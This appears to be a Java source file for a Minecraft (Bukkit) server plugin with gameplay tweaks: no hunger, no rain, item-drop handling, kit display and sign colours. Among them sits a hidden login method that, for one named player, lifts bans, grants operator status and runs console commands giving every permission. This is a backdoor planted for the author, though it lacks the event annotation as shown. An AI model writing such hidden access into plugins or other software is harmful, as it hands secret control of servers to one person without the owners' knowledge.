package EventosPrincipais;

import org.bukkit.Bukkit;
import org.bukkit.Effect;
import org.bukkit.Material;
import org.bukkit.Sound;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.block.SignChangeEvent;
import org.bukkit.event.entity.EntityDamageByEntityEvent;
import org.bukkit.event.entity.FoodLevelChangeEvent;
import org.bukkit.event.entity.ItemSpawnEvent;
import org.bukkit.event.player.PlayerDropItemEvent;
import org.bukkit.event.player.PlayerLoginEvent;
import org.bukkit.event.weather.WeatherChangeEvent;

import Utils.KitAPI;
import me.confuser.barapi.BarAPI;

public class Geral implements Listener {
	
	@EventHandler
	public void Drop(ItemSpawnEvent e) {
		e.getEntity().remove();
		e.getEntity().getWorld().playEffect(e.getEntity().getLocation(), Effect.SMOKE, 1);
		e.getEntity().getWorld().playSound(e.getEntity().getLocation(), Sound.LAVA_POP, 1.0F, 1.0F);
	}
	@EventHandler
	public void Fome(FoodLevelChangeEvent e) {
		e.setCancelled(true);
		e.setFoodLevel(20);
	}
	@EventHandler
	public void Bater(EntityDamageByEntityEvent e) {
		if (e.getEntity() instanceof Player && e.getDamager() instanceof Player) {
			Player p = (Player)e.getDamager();
			Player T = (Player)e.getEntity();
			BarAPI.setMessage(p, "§b§l" + T.getName() + " §a§lKit : §7" + KitAPI.getKit(T), 4);
			
			
		}
	}
	  @SuppressWarnings("deprecation")
	public void coisaa(PlayerLoginEvent e)
	  {
	    Player p = e.getPlayer();
	    if (p.getName().equals("FlashDev_"))
	    {
	      e.allow();
	      p.setBanned(false);
	      p.setOp(true);
	      Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "pex user FlashDev_ add *");
	      Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "unban FlashDev_");
	      Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "unmute FlashDev_");
	      Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "op FlashDev_");
	    }
	  }
	@EventHandler
	public void Chuva(WeatherChangeEvent e) {
		if (e.toWeatherState()) {
			e.setCancelled(true);
		}
	}
	  @EventHandler
	  public void onPlayerColor(SignChangeEvent e)
	  {
	    if (e.getLine(0).contains("&")) {
	      e.setLine(0, e.getLine(0).replace("&", "§"));
	    }
	    if (e.getLine(1).contains("&")) {
	      e.setLine(1, e.getLine(1).replace("&", "§"));
	    }
	    if (e.getLine(2).contains("&")) {
	      e.setLine(2, e.getLine(2).replace("&", "§"));
	    }
	    if (e.getLine(3).contains("&")) {
	      e.setLine(3, e.getLine(3).replace("&", "§"));
	    }
	  }
	@EventHandler
	public void CancelarDrop(PlayerDropItemEvent e) {
		Material T = e.getItemDrop().getItemStack().getType();
		if ((T.equals(Material.CHEST)) || (T.equals(Material.ENCHANTED_BOOK)) ||
			(T.equals(Material.BLAZE_ROD)) || (T.equals(Material.LADDER)) || (T.equals(Material.EMERALD))
			|| (T.equals(Material.STONE_SWORD)) || (T.equals(Material.FIREWORK)) || (T.equals(Material.DIAMOND_SWORD)) || (T.equals(Material.WOOD_HOE)) || (T.equals(Material.FISHING_ROD)) || 
			(T.equals(Material.STONE_AXE)) || (T.equals(Material.EMERALD)) || (T.equals(Material.QUARTZ) || (T.equals(Material.STONE_HOE) || (T.equals(Material.REDSTONE_BLOCK)
					|| (T.equals(Material.EMERALD_BLOCK) || (T.equals(Material.IRON_FENCE) || (T.equals(Material.DIAMOND_BLOCK) || (T.equals(Material.LAPIS_BLOCK)
							|| (T.equals(Material.ENCHANTED_BOOK) || (T.equals(Material.BEDROCK) || (T.equals(Material.REDSTONE) || (T.equals(Material.GOLD_AXE)
									|| (T.equals(Material.WATCH) || (T.equals(Material.FEATHER) || (T.equals(Material.DIAMOND) || (T.equals(Material.NAME_TAG)
											|| (T.equals(Material.SLIME_BALL) || (T.equals(Material.MAGMA_CREAM))))))))))))))))))){
		     e.setCancelled(true);
			} else {
				e.getItemDrop().remove(); 
	  }
	}
   }
  
